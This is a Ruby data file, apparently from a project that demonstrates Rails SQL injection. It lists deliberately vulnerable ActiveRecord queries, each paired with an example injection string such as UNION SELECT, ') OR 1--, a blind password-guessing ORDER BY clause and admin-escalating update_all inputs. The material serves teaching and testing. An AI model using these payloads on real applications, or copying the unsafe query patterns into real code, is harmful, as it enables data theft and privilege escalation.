Queries = [
  {
    :action => :calculate,
    :query => "Order.calculate(:sum, params[:column])",
    :input => {:name => :column, :example => "age) FROM users WHERE name = 'Bob';"}
  },

  {
    :action => :conditions_string,
    :query => 'User.first(:conditions => "name = \'#{params[:name]}\'")',
    :input => {:name => :name, :example => "name=') OR admin = 't' --"}
  },

  {
    :action => :exists,
    :query => 'User.exists? params[:user]',
    :input => {:name => :user, :example => '?'}
  },

  {
    :action => :from_option,
    :query => "User.all(:from => params[:from], :conditions => { :admin => :false })",
    :input => {:name => :from, :example => "users WHERE admin = 't';"}
  },

  {
    :action => :group_option,
    :query => "User.find(:all, :group => params[:group], :conditions => { :admin => false })",
    :input => {:name => :group, :example => "name UNION SELECT * FROM users"}
  },

  {
    :action => :having,
    :query => 'Order.where(:user_id => 1).group(:user_id).having("total > #{params[:total]}")',
    :input => {:name => :total, :example => "1 UNION SELECT * FROM orders"}
  },

  {
    :action => :having_option,
    :query => 'Order.all(:conditions => { :user_id => 1 }, :group => :user_id, :having => "total > #{params[:total]}")',
    :input => {:name => :total, :example => "1 UNION SELECT * FROM orders"}
  },

  {
    :action => :joins,
    :query => 'Order.where(:user_id => 1).joins(params[:table])',
    :input => {:name => :table, :example => ",users--"}
  },

=begin
  #Need to test with a DB that supports it?
  {
    :action => :lock_option,
  },
=end

  {
    :action => :order,
    :query => 'User.order("#{params[:sortby]} ASC")',
    :input => {:name => :sortby, :example => "(CASE SUBSTR(password, 1, 1) WHEN 's' THEN 0 else 1 END)"}
  },

  {
    :action => :order_option,
    :query => 'User.all(:order => "name #{params[:sort]}")',
    :input => {:name => :sort, :example => ',8'}
  },

  {
    :action => :select_option,
    :query => 'User.first(:conditions => { :name => params[:name], :password => params[:password] }, :select => params[:column])',
    :input => {:name => :column, :example => "* FROM users WHERE admin = 't' ;"}
  },

  {
    :action => :where,
    :query => 'User.where("name = \'#{params[:name]}\' AND password = \'#{params[:password]}\'").first',
    :input => {:name => :name, :example => "') OR 1--"}
  },

=begin
  #This is sort of silly and obvious
  {
    :action => :update_all,
    :query => 'User.update_all(params[:update])',
    :input => {:name => :update, :example => "admin=1"}
  },
=end

  {
    :action => :update_all_order_option,
    :query => 'User.update_all("admin = 1", "name LIKE \'B%\'" , { :order => params[:order] })',
    :input => {:name => :order, :example => 'name) OR 1=1;'}
  },

  {
    :action => :update_all_limit_option,
    :query => 'User.update_all("admin = 1", "name LIKE \'B%\'" , { :limit => params[:order] })',
    :input => {:name => :order, :example => 'name) OR 1=1;'}
  },

]
